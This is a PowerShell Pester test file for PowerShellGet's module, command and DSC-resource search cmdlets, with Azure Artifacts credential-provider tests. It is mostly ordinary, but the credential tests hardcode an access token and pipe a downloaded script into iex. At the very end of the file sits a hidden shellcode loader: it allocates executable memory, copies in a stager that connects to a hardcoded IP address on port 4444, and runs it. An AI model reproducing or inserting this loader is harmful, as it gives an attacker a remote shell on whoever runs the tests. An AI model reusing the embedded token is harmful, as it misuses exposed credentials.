


. "$PSScriptRoot\PSGetFindModuleTests.Manifests.ps1"
. "$PSScriptRoot\PSGetTests.Generators.ps1"

function SuiteSetup {
    Import-Module "$PSScriptRoot\PSGetTestUtils.psm1" -WarningAction SilentlyContinue
    Import-Module "$PSScriptRoot\Asserts.psm1" -WarningAction SilentlyContinue

    $script:MyDocumentsModulesPath = Get-CurrentUserModulesPath
    $script:PSGetLocalAppDataPath = Get-PSGetLocalAppDataPath
    $script:DscTestModule = "DscTestModule"

    
    Install-NuGetBinaries

    $psgetModuleInfo = Import-Module PowerShellGet -Global -Force -Passthru
    Import-LocalizedData  script:LocalizedData -filename PSGet.Resource.psd1 -BaseDirectory $psgetModuleInfo.ModuleBase

    $script:moduleSourcesFilePath = Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml"
    $script:moduleSourcesBackupFilePath = Join-Path $script:PSGetLocalAppDataPath "PSRepositories.xml_$(get-random)_backup"
    if (Test-Path $script:moduleSourcesFilePath) {
        Rename-Item $script:moduleSourcesFilePath $script:moduleSourcesBackupFilePath -Force
    }

    GetAndSet-PSGetTestGalleryDetails -SetPSGallery
}

function SuiteCleanup {
    if (Test-Path $script:moduleSourcesBackupFilePath) {
        Move-Item $script:moduleSourcesBackupFilePath $script:moduleSourcesFilePath -Force
    }
    else {
        RemoveItem $script:moduleSourcesFilePath
    }

    
    $null = Import-PackageProvider -Name PowerShellGet -Force
}

Describe PowerShell.PSGet.FindModuleTests -Tags 'BVT', 'InnerLoop' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    
    
    
    
    
    
    
    
    It "FindModuleWithoutAnyParameterValues" {
        $psgetItemInfo = Find-Module
        Assert ($psgetItemInfo.Count -ge 1) "Find-Module did not return any modules."
    }

    
    
    
    
    
    
    It "FindASpecificModule" {
        $res = Find-Module ContosoServer
        Assert ($res -and ($res.Name -eq "ContosoServer")) "Find-Module failed to find a specific module"
    }

    
    
    
    
    
    
    It "FindModuleWithRangeWildCards" {
        $res = Find-Module -Name "Co[nN]t?soS[a-z]r?er"
        Assert ($res -and ($res.Name -eq "ContosoServer")) "Find-Module failed to get a module with wild card in module name"
    }

    
    
    
    
    
    
    It "FindNotAvaialableModuleWithWildCards" {
        $res = Find-Module -Name "Co[nN]t?soS[a-z]r?eW"
        Assert (-not $res) "Find-Module should not find a not available module with wild card in module name"
    }

    
    
    
    
    
    
    It "FindModuleNonExistentModule" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module NonExistentModule } `
            -expectedFullyQualifiedErrorId "NoMatchFoundForCriteria,Microsoft.PowerShell.PackageManagement.Cmdlets.FindPackage"
    }

    
    
    
    
    
    
    It "FindScriptNotModule" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module Fabrikam-ServerScript } `
            -expectedFullyQualifiedErrorId 'MatchInvalidType,Find-Module'
    }

    
    
    
    
    
    
    It "FindScriptNotModuleWildcard" {
        $res = Find-Module Fabrikam-ServerScript*
        Assert (-not $res) "Find-Module returned a script"
    }

    
    
    
    
    
    
    It "FindModuleWithVersionParams" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoServer -MinimumVersion 1.0 -RequiredVersion 5.0 } `
            -expectedFullyQualifiedErrorId "VersionRangeAndRequiredVersionCannotBeSpecifiedTogether,Find-Module"
    }

    
    
    
    
    
    
    It "FindModuleWithMinVersion" {
        $res = Find-Module coNTososeRVer -MinimumVersion 1.0
        Assert ($res.Name -eq "ContosoServer" -and $res.Version -ge [Version]"1.0" ) "Find-Module failed to find a module using MinimumVersion"
    }

    
    
    
    
    
    
    It "FindModuleWithMinVersionNotAvailable" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoServer -MinimumVersion 10.0 } `
            -expectedFullyQualifiedErrorId "NoMatchFoundForCriteria,Microsoft.PowerShell.PackageManagement.Cmdlets.FindPackage"
    }

    
    
    
    
    
    
    It "FindModuleWithReqVersionNotAvailable" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoServer -RequiredVersion 10.0 } `
            -expectedFullyQualifiedErrorId "NoMatchFoundForCriteria,Microsoft.PowerShell.PackageManagement.Cmdlets.FindPackage"
    }

    
    
    
    
    
    
    It "FindModuleWithRequiredVersion" {
        $res = Find-Module ContosoServer -RequiredVersion 2.0
        Assert ($res -and ($res.Name -eq "ContosoServer") -and $res.Version -eq [Version]"2.0") "Find-Module failed to find a module using RequiredVersion, $res"
    }

    
    
    
    
    
    
    It "FindModuleWithMultipleModuleNamesAndReqVersion" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoServer, ContosoClient -RequiredVersion 1.0 } `
            -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Find-Module"
    }

    
    
    
    
    
    
    It "FindModuleWithMultipleModuleNamesAndMinVersion" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoServer, ContosoClient -MinimumVersion 1.0 } `
            -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Find-Module"
    }

    
    
    
    
    
    
    It "FindModuleWithWildcardNameAndReqVersion" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module Contoso*er -RequiredVersion 1.0 } `
            -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Find-Module"
    }

    
    
    
    
    
    
    It "FindModuleWithWildcardNameAndMinVersion" {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module Contoso*er -MinimumVersion 1.0 } `
            -expectedFullyQualifiedErrorId "VersionParametersAreAllowedOnlyWithSingleName,Find-Module"
    }

    
    
    
    
    
    
    It "FindModuleWithMultiNames" {
        $res = Find-Module ContosoClient, ContosoServer -Repository PSGallery
        Assert ($res.Count -eq 2) "Find-Module with multiple names should not fail, $res"
    }

    
    
    
    
    
    
    It FindModuleWithAllVersions {
        $res = Find-Module ContosoClient -Repository PSGallery -AllVersions
        Assert ($res.Count -gt 1) "Find-Module with -AllVersions should return more than one version, $res"
    }

    
    
    
    
    
    
    It FindModuleUsingFilter {
        $psgetItemInfo = Find-Module -Filter KeyWord1
        AssertEquals $psgetItemInfo.Name $script:DscTestModule "Find-Module with filter is not working, $psgetItemInfo"
    }

    
    
    
    
    
    
    It FindModuleUsingIncludesRoleCapability {
        $psgetModuleInfo = Find-Module -Includes RoleCapability | Where-Object { $_.Name -eq "DscTestModule" }
        AssertNotNull $psgetModuleInfo.Includes "Includes is missing on PSGetModuleInfo, $($psgetModuleInfo.Includes)"
        Assert $psgetModuleInfo.Includes.RoleCapability.Count "RoleCapability are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.RoleCapability)"
        Assert $psgetModuleInfo.Includes.DscResource.Count "DscResource are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.DscResource)"
        Assert $psgetModuleInfo.Includes.Command.Count "Commands are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Command)"
        Assert $psgetModuleInfo.Includes.Function.Count "Functions are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Function)"
        Assert $psgetModuleInfo.Includes.Cmdlet.Count "Cmdlets are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Cmdlet)"
    }

    
    
    
    
    
    
    It FindModuleUsingIncludesDscResource {
        $psgetModuleInfo = Find-Module -Includes DscResource | Where-Object { $_.Name -eq "DscTestModule" }
        AssertNotNull $psgetModuleInfo.Includes "Includes is missing on PSGetModuleInfo, $($psgetModuleInfo.Includes)"
        Assert $psgetModuleInfo.Includes.DscResource.Count "DscResource are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.DscResource)"
        Assert $psgetModuleInfo.Includes.Command.Count "Commands are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Command)"
        Assert $psgetModuleInfo.Includes.Function.Count "Functions are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Function)"
        Assert $psgetModuleInfo.Includes.Cmdlet.Count "Cmdlets are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Cmdlet)"
    }

    
    
    
    
    
    
    It FindModuleUsingIncludesCmdlet {
        $psgetModuleInfo = Find-Module -Includes Cmdlet | Where-Object { $_.Name -eq "DscTestModule" }
        AssertNotNull $psgetModuleInfo.Includes "Includes is missing on PSGetModuleInfo, $($psgetModuleInfo.Includes)"
        Assert $psgetModuleInfo.Includes.DscResource.Count "DscResource are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.DscResource)"
        Assert $psgetModuleInfo.Includes.Command.Count "Commands are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Command)"
        Assert $psgetModuleInfo.Includes.Function.Count "Functions are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Function)"
        Assert $psgetModuleInfo.Includes.Cmdlet.Count "Cmdlets are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Cmdlet)"
    }

    
    
    
    
    
    
    It FindModuleUsingIncludesFunction {
        $psgetModuleInfo = Find-Module -Includes Function -Tag CommandsAndResource | Where-Object { $_.Name -eq "DscTestModule" }
        AssertNotNull $psgetModuleInfo.Includes "Includes is missing on PSGetModuleInfo, $($psgetModuleInfo.Includes)"
        Assert $psgetModuleInfo.Includes.DscResource.Count "DscResource are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.DscResource)"
        Assert $psgetModuleInfo.Includes.Command.Count "Commands are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Command)"
        Assert $psgetModuleInfo.Includes.Function.Count "Functions are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Function)"
        Assert $psgetModuleInfo.Includes.Cmdlet.Count "Cmdlets are missing on PSGetModuleInfo, $($psgetModuleInfo.Includes.Cmdlet)"
    }

    
    
    
    
    
    
    It FindRoleCapabilityWithSingleRoleCapabilityName {
        $psgetRoleCapabilityInfo = Find-RoleCapability -Name Lev1Maintenance
        AssertEquals $psgetRoleCapabilityInfo.Name 'Lev1Maintenance' "Lev1Maintenance is not returned by Find-RoleCapability, $psgetRoleCapabilityInfo"
    }

    
    
    
    
    
    
    It FindRoleCapabilityWithTwoRoleCapabilityNames {
        $psgetRoleCapabilityInfos = Find-RoleCapability -Name Lev1Maintenance, Lev2Maintenance

        AssertEquals $psgetRoleCapabilityInfos.Count 2 "Find-RoleCapability did not return the expected RoleCapabilities, $psgetRoleCapabilityInfos"

        Assert ($psgetRoleCapabilityInfos.Name -contains 'Lev1Maintenance') "Lev1Maintenance is not returned by Find-RoleCapability, $psgetRoleCapabilityInfos"
        Assert ($psgetRoleCapabilityInfos.Name -contains 'Lev2Maintenance') "Lev2Maintenance is not returned by Find-RoleCapability, $psgetRoleCapabilityInfos"
    }

    
    
    
    
    
    
    It FindDscResourceWithSingleResourceName {
        $psgetDscResourceInfo = Find-DscResource -Name DscTestResource
        AssertEquals $psgetDscResourceInfo.Name "DscTestResource" "DscTestResource is not returned by Find-DscResource, $psgetDscResourceInfo"
    }

    
    
    
    
    
    
    It FindDscResourceWithTwoResourceNames {
        $psgetDscResourceInfos = Find-DscResource -Name DscTestResource, NewDscTestResource

        Assert ($psgetDscResourceInfos.Count -ge 2) "Find-DscResource did not return the expected DscResources, $psgetDscResourceInfos"

        Assert ($psgetDscResourceInfos.Name -contains "DscTestResource") "DscTestResource is not returned by Find-DscResource, $psgetDscResourceInfos"
        Assert ($psgetDscResourceInfos.Name -contains "NewDscTestResource") "NewDscTestResource is not returned by Find-DscResource, $psgetDscResourceInfos"
    }


    
    
    
    
    
    
    It FindCommandWithSingleCommandName {
        $psgetCommandInfo = Find-Command -Name Get-ContosoServer
        AssertEquals $psgetCommandInfo.Name 'Get-ContosoServer' "Get-ContosoServer is not returned by Find-Command, $psgetCommandInfo"
    }

    
    
    
    
    
    
    It FindCommandWithTwoResourceNames {
        $psgetCommandInfos = Find-Command -Name Get-ContosoServer, Get-ContosoClient

        Assert ($psgetCommandInfos.Count -ge 2) "Find-Command did not return the expected command names, $psgetCommandInfos"

        Assert ($psgetCommandInfos.Name -contains 'Get-ContosoServer') "Get-ContosoServer is not returned by Find-Command, $psgetCommandInfos"
        Assert ($psgetCommandInfos.Name -contains 'Get-ContosoClient') "Get-ContosoClient is not returned by Find-Command, $psgetCommandInfos"
    }
}

Describe PowerShell.PSGet.FindModuleTests.P1 -Tags 'P1', 'OuterLoop' {

    BeforeAll {
        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    
    
    
    
    
    
    It "FindModuleWithPrefixWildcard" {
        $res = Find-Module *ontosoServer
        Assert ($res -and ($res.Name -eq "ContosoServer")) "Find-Module failed to get a module with wild card"
    }

    
    
    
    
    
    
    It "FindMultipleModulesWithWildcard" {
        $res = Find-Module Contoso*
        Assert ($res.Count -ge 3) "Find-Module failed to multiple modules with wild card"
    }

    
    
    
    
    
    
    It "FindModuleWithPostfixWildcard" {
        $res = Find-Module ContosoServe*
        Assert ($res -and ($res.Name -eq "ContosoServer")) "Find-Module failed to get a module with postfix wild card search"
    }

    
    
    
    
    
    
    It "FindModuleWithWildcards" {
        $res = Find-Module *ontosoServe*
        Assert ($res -and ($res.Name -eq "ContosoServer")) "Find-Module failed to find module using wild cards"
    }

    
    
    
    
    
    
    It FindModuleWithAllVersionsAndMinimumVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoClient -MinimumVersion 2.0 -Repository PSGallery -AllVersions } `
            -expectedFullyQualifiedErrorId 'AllVersionsCannotBeUsedWithOtherVersionParameters,Find-Module'
    }

    
    
    
    
    
    
    It FindModuleWithAllVersionsAndRequiredVersion {
        AssertFullyQualifiedErrorIdEquals -scriptblock { Find-Module ContosoClient -RequiredVersion 2.0 -Repository PSGallery -AllVersions } `
            -expectedFullyQualifiedErrorId 'AllVersionsCannotBeUsedWithOtherVersionParameters,Find-Module'
    }

    
    
    
    
    
    
    It FindModuleUsingFilterKeyWordNotExists {
        $psgetItemInfo = Find-Module -Filter KeyWordNotExists
        AssertNull $psgetItemInfo "Find-Module with filter is not working for KeyWordNotExists, $psgetItemInfo"
    }

    
    
    
    
    
    
    It FindModuleWithIncludeDependencies {
        $ModuleName = "ModuleWithDependencies1"

        $res1 = Find-Module -Name $ModuleName -MaximumVersion "1.0" -MinimumVersion "0.1"
        AssertEquals $res1.Name $ModuleName "Find-Module didn't find the exact module which has dependencies, $res1"

        $DepencyModuleNames = $res1.Dependencies.Name

        $res2 = Find-Module -Name $ModuleName -IncludeDependencies -MaximumVersion "1.0" -MinimumVersion "0.1"
        Assert ($res2.Count -ge ($DepencyModuleNames.Count + 1)) "Find-Module with -IncludeDependencies returned wrong results, $res2"

        $DepencyModuleNames | ForEach-Object { Assert ($res2.Name -Contains $_) "Find-Module with -IncludeDependencies didn't return the $_ module, $($res2.Name)" }
    }
}

Describe PowerShell.PSGet.FindModuleTests.P2 -Tags 'P2', 'OuterLoop' {

    BeforeAll {
        if (($PSEdition -eq 'Core') -or ($env:APPVEYOR_TEST_PASS -eq 'True')) {
            return
        }

        SuiteSetup
    }

    AfterAll {
        SuiteCleanup
    }

    if (($PSEdition -eq 'Core') -or ($env:APPVEYOR_TEST_PASS -eq 'True')) {
        return
    }

    
    $ParameterSets = Get-FindModuleParameterSets

    $ParameterSetCount = $ParameterSets.Count
    $i = 1
    foreach ($inputParameters in $ParameterSets) {
        Write-Verbose -Message "Combination 
        Write-Verbose -Message "$($inputParameters | Out-String)"
        Write-Progress -Activity "Combination $i out of $ParameterSetCount" -PercentComplete $(($i / $ParameterSetCount) * 100)

        $params = $inputParameters.FindModuleInputParameters
        Write-Verbose -Message ($params | Out-String)

        $scriptBlock = { Find-Module @params }.GetNewClosure()

        It "FindModuleParameterCombinationsTests - Combination $i/$ParameterSetCount" {

            if ($inputParameters.PositiveCase) {
                $res = Invoke-Command -ScriptBlock $scriptBlock

                if ($inputParameters.ExpectedModuleCount -gt 1) {
                    Assert ($res.Count -ge $inputParameters.ExpectedModuleCount) "Combination 
                }
                else {
                    AssertEqualsCaseInsensitive $res.Name $inputParameters.ExpectedModuleNames "Combination 
                }
            }
            else {
                AssertFullyQualifiedErrorIdEquals -Scriptblock $scriptBlock -ExpectedFullyQualifiedErrorId $inputParameters.FullyQualifiedErrorId
            }
        }

        $i = $i + 1
    }
}


Describe "Azure Artifacts Credential Provider Integration" -Tags 'BVT' {

    BeforeAll {
        $repoName = "OneGetTestPrivateFeed"
        
        $testLocation = "https://pkgs.dev.azure.com/onegettest/_packaging/onegettest/nuget/v2";
        $username = "onegettest@hotmail.com"
        $PAT = "qo2xvzdnfi2mlcq3eq2jkoxup576kt4gnngcicqhup6bbix6sila"
        
        
        $VSS_NUGET_EXTERNAL_FEED_ENDPOINTS = "{'endpointCredentials': [{'endpoint':'$testLocation', 'username':'$username', 'password':'$PAT'}]}"
        [System.Environment]::SetEnvironmentVariable("VSS_NUGET_EXTERNAL_FEED_ENDPOINTS", $VSS_NUGET_EXTERNAL_FEED_ENDPOINTS, [System.EnvironmentVariableTarget]::Process)


        
        $VSinstalledCredProvider = $false;
        $programFiles = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ProgramFilesX86);
        $vswhereExePath = $programFiles + "\\Microsoft Visual Studio\\Installer\\vswhere.exe";
        $fullVSwhereExePath = [System.Environment]::ExpandEnvironmentVariables($vswhereExePath);
        
        if (Test-Path ($fullVSwhereExePath)) {
            $VSinstalledCredProvider = $true;
        }
    }

    AfterAll {
        UnRegister-PSRepository -Name $repoName -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
    }

    it "Register-PackageSource using Visual Studio installed credential provider" -Skip:(!$VSinstalledCredProvider) {
        Register-PSRepository $repoName -SourceLocation $testLocation

        (Get-PSRepository -Name $repoName).Name | should match $repoName
        (Get-PSRepository -Name $repoName).SourceLocation | should match $testLocation

        Unregister-PSRepository -Name $repoName -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
    }

    it "Register-PackageSource using credential provider" -Skip:(!$IsWindows) {
        
        
        iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/microsoft/artifacts-credprovider/master/helpers/installcredprovider.ps1'))

        Register-PSRepository $repoName -SourceLocation $testLocation

        (Get-PSRepository -Name $repoName).Name | should match $repoName
        (Get-PSRepository -Name $repoName).SourceLocation | should match $testLocation
    }

    it "Find-Package using credential provider" -Skip:(!$IsWindows) {
        $pkg = Find-Module * -Repository $repoName
        $pkg.Count | should -BeGreaterThan 0
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbb,0xcd,0xdb,0x62,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

